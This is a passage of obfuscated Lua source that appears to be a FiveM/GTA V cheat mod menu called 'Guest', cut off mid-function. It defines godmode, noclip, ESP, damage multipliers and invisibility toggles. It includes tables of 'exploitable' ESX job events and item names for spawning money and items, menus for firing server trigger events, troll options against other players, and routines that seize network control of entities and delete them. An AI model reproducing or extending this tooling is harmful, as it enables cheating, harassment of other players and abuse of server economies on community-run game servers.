            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    elseif I.GuestCurrentUI.selectedUI == "Green" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.setTitleBackgroundSprite(aW, "Guest2", "GuestHeader2")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 0, 220, 0, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 53, 190, 58, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    elseif I.GuestCurrentUI.selectedUI == "Red" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.setTitleBackgroundSprite(aW, "Guest4", "GuestHeader4")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 235, 0, 0, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 235, 0, 0, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    elseif I.GuestCurrentUI.selectedUI == "Orange" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.setTitleBackgroundSprite(aW, "Guest3", "GuestHeader3")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 255, 55, 0, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 255, 55, 0, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    elseif I.GuestCurrentUI.selectedUI == "RGB" then
        I.mainColor = {r = 255, g = 255, b = 255, a = 255}
        I.GuestCurrentUI.selectedUIRainbow =
            not I.GuestCurrentUI.selectedUIRainbow
        selectedUIRainbow = true
        rainbowValue = 1
        I.setTitleBackgroundSprite(aW, "Guest6", "GuestHeader6")
        I.setMenuBackgroundColor(aW, 15, 15, 15, 205)
        I.setMenuFocusBackgroundColor(aW, 109, 0, 164, 255)
        I.setMenuSubTitleBackgroundColor(aW, 0, 0, 0, 235)
        I.setTitleBackgroundColor(aW, 15, 15, 15, 0)
        I.setTitleColor(aW, 255, 255, 255, 0)
        I.setMenuTextColor(aW, 245, 245, 245)
        I.setMenuFocusTextColor(aW, 255, 255, 255, 255)
        I.setMenuSubTextColor(aW, 255, 255, 255, 255)
        I.setFont(aW, 4)
        I.setMenuX(aW, 0.03)
        I.setMenuY(aW, 0.1)
        I.setMenuWidth(aW, 0.25)
        I.setMaxOptionCount(aW, 15)
        I.GuestCurrentUI.titleHeight = 0.1
        I.GuestCurrentUI.titleXOffset = 0.15
        I.GuestCurrentUI.titleYOffset = 0.00485
        I.GuestCurrentUI.titleScale = 0.25
        I.GuestCurrentUI.titleSpacing = 2.0
        I.GuestCurrentUI.buttonHeight = 0.035
        I.GuestCurrentUI.buttonScale = 0.360
        I.GuestCurrentUI.buttonTextXOffset = 0.003
        I.GuestCurrentUI.buttonTextYOffset = 0.0025
        I.menuTabsColors = {
            selfOptions = {r = 255, g = 255, b = 255},
            onlineOptions = {r = 255, g = 255, b = 255},
            visualOptions = {r = 255, g = 255, b = 255},
            teleportOptions = {r = 255, g = 255, b = 255},
            vehicleOptions = {r = 255, g = 255, b = 255},
            weaponOptions = {r = 255, g = 255, b = 255},
            serverOptions = {r = 255, g = 255, b = 255},
            menuOptions = {r = 255, g = 255, b = 255}
        }
    end
end
function I.initTheme()
    for b7 = 1, #I.menus_list do
        I.setTheme(I.menus_list[b7], I.GuestCurrentUI.selectedUI)
    end
end
I.addNotification2 = function(L, dW)
    d.Main.GuestTable.GuestInsert(
        I.GuestNotif,
        {["text"] = L, ["time"] = dW, ["startTime"] = GetGameTimer()}
    )
end
I.removeNotification2 = function(aW)
    d.Main.GuestTable.GuestRemove(
        I.GuestNotif,
        aW
    )
end
I.draw_3D = function(x, y, L, dX)
    if dX > 255 then
        dX = 255
    elseif dX < 0 then
        dX = 0
    end
    I.natives.setTextScale(0.35, 0.35)
    if I.GuestCurrentUI.menu_TextDropShadow then
        I.natives.setTextDropShadow(0, 0, 0, 0, 255)
    end
    SetTextEdge(2, 0, 0, 0, 255)
    if I.GuestCurrentUI.menu_TextOutline then
        I.natives.setTextOutline()
    end
    I.natives.setTextFont(4)
    I.natives.setTextProportional(1)
    I.natives.setTextColour(
        255,
        255,
        255,
        d.Main.GuestMath.GuestFloor(dX)
    )
    I.natives.beginTextCommandDisplayText("STRING")
    SetTextCentre(1)
    I.natives.addTextComponentSubstringPlayerName(L)
    I.natives.endTextCommandDisplayText(x, y)
    local dY = string.len(L) / 300
    I.natives.DrawRect(x, y + 0.0135, 0.0155 + dY, 0.03, 25, 25, 25, dX)
    I.natives.DrawRect(x, y + 0.0125, 0.015 + dY, 0.03, I.mainColor.r, I.mainColor.g, I.mainColor.b, dX)
end
I.pushNotification2 = function(L, dW)
    if L then
        if not dW then
            dW = 5000
        end
        I.addNotification2(L, dW)
    end
end
rE = {
    None = 0,
    Normal = 1,
    TransparentNormal = 2,
    PreGrab = 3,
    Grab = 4,
    MiddleFinger = 5,
    LeftArrow = 6,
    RightArrow = 7,
    UpArrow = 8,
    DownArrow = 9,
    HorizontalExpand = 10,
    Add = 11,
    Remove = 12
}
I.OptionConfig = {
    godmode = false,
    semiGodmode = false,
    infStamina = false,
    neverWanted = false,
    noClip = false,
    invisible = false,
    bInvisible = false,
    noRagdoll = false,
    superJump = false,
    dcbac0a08778fb9e3b9045c19dd7 = false,
    heatVision = false,
    nightVision = false,
    tinyPlayer = false,
    bTinyPlayer = false,
    flashmanSP = false,
    vehGodmode = false,
    veh2Step = false,
    vehRainbowCol = false,
    vehRainbowLights = false,
    vehWallride = false,
    vehSpawnUpgraded = false,
    Watermark = false,
    vehNoFall = false,
    DrivingStyles = {
        "Évitez le trafic extrême",
        "Parfois, dépasser le trafic",
        "Pressé",
        "Normal",
        "Ignorer les lumières",
        "Évitez le trafic"
    },
    CruiseSpeed = 50.0,
    DrivingStyle = 1,
    SelCruiseSpeedIndex = 1,
    CurCruiseSpeedIndex = 1,
    AutoClean = false,
    vehSpawnInside = true,
    vehAlwaysWheelie = false,
    vehDriftSmoke = false,
    currenteaf9f0780ceafe031efb200e0ebb5f = 1,
    selectedeaf9f0780ceafe031efb200e0ebb5f = 1,
    weapSpawnAsPickup = false,
    weapExplosiveAmmo = false,
    weapCustomBullet = false,
    weaponsDamageMultiplier = {1.0, 2.0, 3.0, 5.0, 10.0, 25.0, 50.0, 250.0, 1000.0},
    weaponsDamageMultiplierCurrent = 1,
    weaponsDamageMultiplierSelected = 1,
    weaponsDamageMultiplierSet = 1,
    InfiniteCombatRoll = false,
    NoRecoil = false,
    weaponsGiveAmmoCurrent = 1,
    infAmmo2 = false,
    weaponsGiveAmmoSelected = 1,
    visb5ea815b0f8440ddaeebad4129bd7222 = false,
    visForceRadar = false,
    ForceNamess = false,
    visForceThirdperson = false,
    visESPEnable = false,
    visESPShowID = false,
    visESPShowName = false,
    visESPShowDistance = false,
    visESPShowWeapon = false,
    visESPShowVehicle = false,
    visDrawFPS = false,
    visualsESPRefreshRate = 0,
    visualsESPRefreshRates = {"0ms", "50ms", "150ms", "250ms", "500ms", "1s", "2s", "5s"},
    visualsESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0},
    visualsESPDistance = 500.0,
    currentVisualsESPDistance = 1,
    selectedVisualsESPDistance = 4,
    currentESPRefreshIndex = 1,
    selectedESPRefreshIndex = 1,
    teleShowCoords = false,
    currentTeleportToOptions = 1,
    selectedTeleportToOptions = 1,
    sPOIsSpectating = false,
    sPOFlingPlayer = false,
    sPOFlingedPlayer = nil,
    spectatedPlayer = nil,
    sPOShootAtOptionsCurrent = 1,
    sPOShootAtOptionsSelected = 1,
    aPOFlyingCars = false,
    aPOFreeze = false,
    aPODisableDrivingCars = false,
    aPONoisyVehs = false,
    SSBBypass = false
}
I.menuTables = {
    weaponsCustomBullet = {
        current = 1,
        selected = 1,
        actual = 1,
        words = {"RPG", "Firework", "Flare", "Tracer Rocket", "Tank Rocket", "Pistolet", "MicroSMG", "Taser"},
        lists = {
            "WEAPON_RPG",
            "WEAPON_FIREWORK",
            "WEAPON_FLAREGUN",
            "VEHICLE_WEAPON_PLAYER_LASER",
            "VEHICLE_WEAPON_TANK",
            "WEAPON_PISTOL",
            "WEAPON_MICROSMG",
            "WEAPON_STUNGUN"
        }
    },
    vehiclePerformanceTable = {
        {name = "Engine", id = 11},
        {name = "Brakes", id = 12},
        {name = "Transmission", id = 13},
        {name = "Suspension", id = 15},
        {name = "Armour", id = 16}
    },
    serverKashactersSQL = {
        current = 1,
        selected = 1,
        actual = 1,
        words = {"User Inventory", "Owned Vehicles", "Bills", "Shops", "Characters", "Vehicles"},
        lists = {"user_inventory", "owned_vehicles", "billing", "shops", "characters", "vehicles"}
    },
    trollsPropBlock = {current = 1, selected = 1, words = {"Legion Square", "MRPD", "PDM"}},
    exploitableJobsTable = {
        "Unemployed",
        "Mechanic",
        "Police",
        "Ambulance",
        "Taxi",
        "Real Estate Agent",
        "Car Dealer",
        "Banker",
        "Gang",
        "Mafia"
    },
    customExploitableItems = {}
}
I.menuTables.exploitableJobsTable.Item = {
    "Butcher",
    "Tailor",
    "Miner",
    "Fueler",
    "Lumberjack",
    "Fisher",
    "Hunting",
    "Weed",
    "Meth",
    "Coke",
    "Opium"
}
I.menuTables.exploitableJobsTable.ItemDatabase = {
    ["Butcher"] = b8.new {
        "Alive Chicken",
        "alive_chicken",
        "Slaughtered Chicken",
        "slaughtered_chicken",
        "Packaged Chicken",
        "packaged_chicken"
    },
    ["Tailor"] = b8.new {"Wool", "wool", "Fabric", "fabric", "Clothes", "clothe"},
    ["Fueler"] = b8.new {"Petrol", "petrol", "Refined Petrol", "petrol_raffin", "Essence", "essence"},
    ["Miner"] = b8.new {"Stone", "stone", "Washed Stone", "washed_stone", "Diamond", "diamond"},
    ["Lumberjack"] = b8.new {"Wood", "wood", "Cutted Wood", "cutted_wood", "Packed Plank", "packaged_plank"},
    ["Fisher"] = b8.new {"Fish", "fish"},
    ["Hunting"] = b8.new {"Meat", "meat"},
    ["Coke"] = b8.new {"Coke", "coke", "Coke Bag", "coke_pooch"},
    ["Weed"] = b8.new {"Weed", "weed", "Weed Bag", "weed_pooch"},
    ["Meth"] = b8.new {"Meth", "meth", "Meth Bag", "meth_pooch"},
    ["Opium"] = b8.new {"Opium", "opium", "Opium Bag", "opium_pooch"}
}
I.menuTables.exploitableJobsTable.ItemRequires = {
    ["Fabric"] = "Wool",
    ["Clothes"] = "Fabric",
    ["Washed Stone"] = "Stone",
    ["Diamond"] = "Washed Stone",
    ["Coke Bag"] = "coke",
    ["Weed Bag"] = "weed",
    ["Meth Bag"] = "meth",
    ["Opium Bag"] = "opium"
}
I.menuTables.exploitableJobsTable.Money = {
    "Fuel Delivery",
    "Car Thief",
    "DMV School",
    "Dirty Job",
    "Pizza Boy",
    "Ranger Job",
    "Garbage Job",
    "Car Thief",
    "Trucker Job",
    "Postal Job",
    "Banker Job"
}
I.menuTables.exploitableJobsTable.Money.Value = {
    "esx_fueldelivery",
    "esx_carthief",
    "esx_dmvschool",
    "esx_godirtyjob",
    "esx_pizza",
    "esx_ranger",
    "esx_garbagejob",
    "esx_carthief",
    "esx_truckerjob",
    "esx_gopostaljob",
    "esx_banksecurity"
}
local dZ = "number"
I.keyBinds = {
    currentKeybindMenu = {label = "Open Menu", handle = "PAGEUP"},
    currentKeybindHealth = {label = "Refill Health", handle = "F1"},
    currentKeybindArmour = {label = "Refill Armour", handle = "F2"},
    currentKeybindRepair = {label = "Repair vehicle", handle = nil},
    currentKeybindNoclip = {label = "Noclip", handle = nil},
    currentKeybindEspion = {label = "Espion", handle = nil},
    currentKeybindMagneto = {label = "Toggle Magneto", handle = nil},
    currentKeybindFreecam = {label = "Toggle Freecam", handle = "F3"},
    currentKeybindInvisible = {label = "Toggle Invisible", handle = nil},
    currentKeybindPanic = {label = "Panic Key", handle = nil},
    currentKeybinddeleteweps = {label = "Delete all weapons", handle = nil},
    currentKeybindRevive = {label = "Revive", handle = nil}
}
local d_ = 1
local e0 = 1
local e1 = dZ
local e2 = {"Off", "Default", "Custom"}
I.menuTables.customExploitableItems.Item = {
    "Repair Kit",
    "Bandage",
    "Medkit",
    "Bitcoin",
    "Gold",
    "Jewels",
    "Drill",
    "Lockpick"
}
I.menuTables.customExploitableItems.ItemDatabase = {
    ["Repair Kit"] = b8.new {"Repair Kit", "fixkit"},
    ["Bandage"] = b8.new {"Bandage", "bandage"},
    ["Medkit"] = b8.new {"Medkit", "medikit"},
    ["Bitcoin"] = b8.new {"Bitcoin", "bitcoin"},
    ["Gold"] = b8.new {"Gold", "gold"},
    ["Jewels"] = b8.new {"Jewels", "jewels"},
    ["Drill"] = b8.new {"Drill", "drill"},
    ["Lockpick"] = b8.new {"Lockpick", "lockpick"}
}
I.menuTables.customExploitableItems.ItemRequires = {
    ["Repair Kit"] = "fixkit",
    ["Bandage"] = "bandage",
    ["Medkit"] = "medikit",
    ["Bitcoin"] = "bitcoin",
    ["Gold"] = "gold",
    ["Jewels"] = "jewels",
    ["Drill"] = "drill",
    ["Lockpick"] = "lockpick"
}
local e3 = 1
local e4 = 1
local e5 = 1
local e6 = 1
local e7 = 1
local e8 = 1
local e9 = 1
local ea = 1
local eb = {"Police", "Ambulance", "Mechanic", "Taxi", "Cardealer", "Gang", "RealEstateAgent"}
local ec = 1
local ed = 1
local ee = 1
local ef = 1
local eg = 4
local eh = 4
local ei = {0.03, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75}
local ej = {0.1, 0.1, 0.2, 0.3, 0.425}
local ek = 4
local el = 4
local em = {5, 10, 11, 12, 13, 14, 15, 20, 25}
I.comboBoxes = {
    [0] = {_words = {"Option 1", "Option 2"}, _current = 1, _selected = 1},
    [1] = {_words = {"1", "2"}, _current = 1, _selected = 1},
    [2] = {
        _words = {"jester3", "elegy", "sultanrs", "coquette3", "monster", "banshee2", "specter", "xa21"},
        _current = 1,
        _selected = 1
    },
    [3] = {
        _words = {
            "+1/100",
            "+2/100",
            "+4/100",
            "+8/100",
            "+16/100",
            "+32/100",
            "+64/100",
            "+128/100",
            "+256/100",
            "+512%"
        },
        _actual = {1.0, 2.0, 4.0, 8.0, 16.0, 32.0, 64.0, 128.0, 256.0, 512.0},
        _current = 1,
        _selected = 1
    },
    [4] = {
        _words = {
            "Gas Pump",
            "Beach Fire",
            "Gas Tank",
            "UFO",
            "Dildo",
            "Toilet",
            "Missile",
            "Couch",
            "Banana Party",
            "Ramp"
        },
        _actual = {
            {"prop_gas_pump_1d", "prop_gas_pump_1b", "prop_gas_pump_old3", "prop_gas_pump_1a"},
            "prop_beach_fire",
            "prop_gas_tank_01a",
            "p_spinning_anus_s",
            "prop_cs_dildo_01",
            "prop_ld_toilet_01",
            "prop_ld_bomb_anim",
            "prop_ld_farm_couch01",
            {"p_crahsed_heli_s", "prop_rock_4_big2", "prop_beachflag_le"},
            {"stt_prop_stunt_track_uturn", "stt_prop_stunt_track_turnice", "stt_prop_stunt_track_hill"}
        },
        _current = 1,
        _selected = 1
    }
}
N_0x98215325a695e78a(true)
d.Main.GuestThread(
    function()
        local en = 3
        local eo = 3
        local ep = 1
        local eq = 1
        local er = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
        local es = {"0/100", "20/100", "40/100", "60/100", "80/100", "Max"}
        local et = 1
        local eu = 1
        local ev = 1
        local ew = 1
        local ex = {1.0, 0.8, 0.6, 0.4, 0.2, 0.1, 0.0}
        local ey = 1
        local ez = 1
        local eA = {"Default", "-20/100", "-40/100", "-60/100", "-80/100", "-100/100"}
        local eB = 1
        local eC = 1
        local eD = 1
        local eE = "bus"
        local eF = {"bus", "monster", "freight", "bulldozer"}
        local eG = 1
        local eH = 1
        local eI = 1
        local eJ = 1
        local eK = nil
        local eL = nil
        local eM = nil
        I.GuestMenuCreating(
            "Guest",
            "Guest"
        )
        I.SubSettingTitle("Guest", "	               	    	   Main Menu")
        I.MenuSubCreating("selfOptions", "Guest", "	               	    	   My options")
        I.MenuSubCreating(
            "onlinePlayersOptions",
            "Guest",
            "	               	    	   Players"
        )
        I.MenuSubCreating("visualOptions", "Guest", "	               	    	   	Visuals")
        I.MenuSubCreating("teleportOptions", "Guest", "	               	    	   Téléports")
        I.MenuSubCreating("vehicleOptions", "Guest", "	               	    	   Vehicles")
        I.MenuSubCreating("weaponOptions", "Guest", "	               	    	   Weapons")
        I.MenuSubCreating("serverOptions", "Guest", "	               	    	   Servers")
        I.MenuSubCreating("menuSettings", "Guest", "	               	    	   Options Menu")
        I.MenuSubCreating("miscoptions", "Guest", "	               	    	   Misc")
        I.MenuSubCreating("giveoptions", "Guest", "	               	    	   Give Options")
        I.MenuSubCreating("glifeoptions", "Guest", "	               	    	   GLife Hack")
        I.MenuSubCreating("trolloptions", "Guest", "	               	    	   Troll & Utils")
        I.MenuSubCreating("protec", "Guest", "	               	    	   Protections")
        I.MenuSubCreating("serversoptions", "Guest", "	               	    	   Server")
        I.MenuSubCreating("luaoptions", "Guest", "	               	    	   Lua options")
        I.MenuSubCreating("keybindSettings2", "Guest", "Keybinds")
        I.MenuSubCreating("teleportplayer", "Guest", "Teleport Options")
        I.MenuSubCreating("dynamicstriggers", "serversoptions", "Dynamic Triggers")
        I.MenuSubCreating("worldoptions", "Guest", "World")
        I.MenuSubCreating("selfSuperPowers", "selfOptions", "My options > Misc")
        I.MenuSubCreating("selfClothing", "selfOptions", "Clothing")
        I.MenuSubCreating("utiles", "selfOptions", "Utiles")
        I.MenuSubCreating("outfitoptions", "selfOptions", "Change of outfit")
        I.MenuSubCreating("skinchanger", "selfOptions", "Changer")
        I.MenuSubCreating("allPlayersOptions", "onlinePlayersOptions", "All players")
        I.MenuSubCreating("allPlayersOptionsTriggers", "allPlayersOptions", "All players > Trigger Events")
        I.MenuSubCreating("selectedPlayerOptions", "onlinePlayersOptions", "Player options")
        I.MenuSubCreating("selectedPlayerOptionsTriggers", "selectedPlayerOptions", "Joueur > Triggers")
        I.MenuSubCreating("selectedPlayerOptionsTroll", "selectedPlayerOptions", "Joueur > Troll")
        I.MenuSubCreating("selectedPlayerOptionsWeapon", "selectedPlayerOptions", "Joueur > Weapons")
        I.MenuSubCreating("followingoptions", "selectedPlayerOptionsTroll", "Following Options")
        I.MenuSubCreating("attachoptions", "selectedPlayerOptionsTroll", "Attach options")
        I.MenuSubCreating("visualOptionsESP", "visualOptions", "Visual ESP Options")
        I.MenuSubCreating("visions", "visualOptions", "Visions options")
        I.MenuSubCreating("doorsoptions", "vehicleOptions", "Portes")
        I.MenuSubCreating("savedVehiclesOptions", "vehicleOptions", "Vehicles > Saved Cars")
        I.MenuSubCreating("selectedSavedVehicleOptions", "savedVehiclesOptions", "Vehicles > Saved Cars Options")
        I.MenuSubCreating("vehicleLosSantosCustoms", "vehicleOptions", "Vehicles > Customise a car")
        I.MenuSubCreating("vehicleLosSantosCustomsCosmetics", "vehicleLosSantosCustoms", "Cosmetics")
        I.MenuSubCreating("vehicleLosSantosCustomsPerformance", "vehicleLosSantosCustoms", "Performances")
        I.MenuSubCreating("simplecolors", "vehicleLosSantosCustomsCosmetics", "Colors")
        I.MenuSubCreating("vehiclecolors", "simplecolors", "Colors")
        I.MenuSubCreating("vehiclecolors2", "simplecolors", "Colors")
        for b7, eN in pairs(I.menuTables.vehiclePerformanceTable) do
            I.MenuSubCreating(
                "vehicleLosSantosCustomsPerformance" .. eN.name,
                "vehicleLosSantosCustomsPerformance",
                "Guest | " .. eN.name
            )
        end
        I.MenuSubCreating("vehicleSpawnList", "vehicleOptions", "Vehicles > Spawn Options")
        I.MenuSubCreating("vehicleutils", "vehicleOptions", "Vehicle Utils")
        I.MenuSubCreating("autopilot", "vehicleOptions", "Auto Pilot")
        I.MenuSubCreating("vehicleSpawnSelected", "vehicleSpawnList", "Vehicles > Select a vehicle")
        I.MenuSubCreating("vehicleSpawnSelectedOptions", "vehicleSpawnSelected", "Véhicule > Selected car")
        I.MenuSubCreating("weaponOptionsModification", "weaponOptions", "Weapons > Modification")
        I.MenuSubCreating("weaponOptionsTypes", "weaponOptions", "Type")
        I.MenuSubCreating("weaponOptionsTypeSelection", "weaponOptionsTypes", "Weapons > Selection")
        I.MenuSubCreating("weaponsModOptions", "weaponOptionsTypeSelection", "Weapons > Options")
        I.MenuSubCreating("weaponsModSelect", "weaponsModOptions", "Weapons > Mod Options")
        I.MenuSubCreating("weaponskit", "weaponOptions", "Kits")
        I.MenuSubCreating("serverOptionsResources2", "serversoptions", "Resources")
        I.MenuSubCreating("serverOptionsResourcesSelected", "serverOptionsResources", "Selected Resource")
        I.MenuSubCreating(
            "serverOptionsResourcesSelectedCEvents",
            "serverOptionsResourcesSelected",
            "Selected Resource Client Events"
        )
        I.MenuSubCreating(
            "serverOptionsResourcesSelectedSEvents",
            "serverOptionsResourcesSelected",
            "Selected Resource Server Events"
        )
        I.MenuSubCreating("serverOptionsTriggerEvents", "serverOptions", "Trigger Events")
        I.MenuSubCreating("serverOptionsTriggerEventsESX", "serverOptionsTriggerEvents", "ESX Trigger Events")
        I.MenuSubCreating("serverOptionsTriggerEventsVRP", "serverOptionsTriggerEvents", "vRP Trigger Events")
        I.MenuSubCreating("serverOptionsTriggerEventsESXMoney", "serverOptionsTriggerEventsESX", "ESX Money Options")
        I.MenuSubCreating("credits", "menuSettings", "Menu Credits")
        I.MenuSubCreating("keybindSettings", "menuSettings", "Keybind Settings")
        I.MenuSubCreating("settingsoptions", "Guest", "Settings")
        I.MenuSubCreating("destroyeroptions", "trolloptions", "Destroyer Options")
        I.MenuSubCreating("utilsservers", "trolloptions", "Server Utils")
        I.MenuSubCreating("Guestsettings", "settingsoptions", "Menu Settings")
        I.MenuSubCreating("configss", "settingsoptions", "Configs")
        I.MenuSubCreating("entityoptions", "worldoptions", "Entity Options")
        I.MenuSubCreating("meteooptions", "worldoptions", "Time options")
        I.initTheme(1)
        local eO = 0
        local eP = 1
        while I.shouldShowMenu do
            I.Guestdata.pLocalPlayer.cVehicle =
                GetVehiclePedIsUsing(I.Guestdata.pLocalPlayer.pedId)
            I.Guestdata.pLocalPlayer.pedId = PlayerPedId(-1)
            if eO == 0 then
                d.Main.GuestThread(
                    function()
                        while I.shouldShowMenu do
                            d.Main.GuestWait(2000)
                            eO = eO + 1
                            eP = eP - 1
                            d.Main.GuestWait(2000)
                        end
                    end
                )
            end
            if I.isMenuOpened("Guest") then
                if I.menuButton("   My options", "selfOptions", ">") then
                elseif I.menuButton("   Players", "onlinePlayersOptions", ">") then
                elseif I.menuButton("   Vehicles", "vehicleOptions", ">") then
                elseif I.menuButton("   Weapons", "weaponOptions", ">") then
                elseif I.menuButton("   Teleports", "teleportOptions", ">") then
                elseif I.menuButton("   Visuals", "visualOptions", ">") then
                elseif I.menuButton("   World", "worldoptions", ">") then
                elseif I.menuButton("   Server", "serversoptions", ">") then
                elseif I.menuButton("   Settings", "settingsoptions", ">") then
                    I.DrawRect(
                        x,
                        y,
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].width,
                        I.GuestCurrentUI.buttonHeight,
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].subTitleBackgroundColor
                    )
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("worldoptions") then
                if I.menuButton("Time/weather", "meteooptions", ">") then
                elseif I.menuButton("Entity Options", "entityoptions", ">") then
                elseif I.checkBox("Disable Cars", I.OptionConfig.CarsDisabled) then
                    I.OptionConfig.CarsDisabled = not I.OptionConfig.CarsDisabled
                elseif I.checkBox("Disable Guns", I.OptionConfig.GunsDisabled) then
                    I.OptionConfig.GunsDisabled = not I.OptionConfig.GunsDisabled
                elseif I.checkBox("Disable Cars", I.OptionConfig.CarsDisabled) then
                    I.OptionConfig.CarsDisabled = not I.OptionConfig.CarsDisabled
                elseif
                    I.comboBoxSlider(
                        "Gravity Amount",
                        GravityOpsWords,
                        t,
                        u,
                        function(dI, dJ)
                            t = dI
                            u = dI
                            GravAmount = GravityOps[t]
                            for h in f79156a3ecec7e2fae4e99ae06a241f() do
                                RequestControlOnce(h)
                                SetVehicleGravityAmount(h, GravAmount)
                            end
                        end
                    )
                 then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("entityoptions") then
                if I.button("Clear Objects") then
                    for eQ in d22eb5d3d78dc75e96647692c5() do
                        NetworkRequestControlOfEntity(eQ)
                        DeleteEntity(eQ)
                    end
                elseif I.button("Clear Vehicles") then
                    for X in f79156a3ecec7e2fae4e99ae06a241f() do
                        NetworkRequestControlOfEntity(X)
                        DeleteEntity(X)
                    end
                elseif I.button("Clear Peds") then
                    for K in EnumeratePeds() do
                        if K ~= PlayerPedId() and not IsPedAPlayer(K) then
                            NetworkRequestControlOfEntity(K)
                            DeleteEntity(K)
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serversoptions") then
                if I.menuButton("Troll & Utils", "trolloptions", ">") then
                elseif I.menuButton("Lua", "luaoptions", ">") then
                elseif I.menuButton("Give Options", "giveoptions", ">") then
                elseif I.menuButton("GLife", "glifeoptions", ">") then
                elseif I.menuButton("Resources", "serverOptionsResources2", ">") then
                elseif I.menuButton("Dynamic Triggers", "dynamicstriggers", ">") then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("dynamicstriggers") then
                if I.button("Revive", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_ambulancejob") then
                        TriggerEvent("esxambulancejob:revive")
                    end
                elseif I.button("Gofast", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("GoFast") then
                        d.Main.GuestEvent(
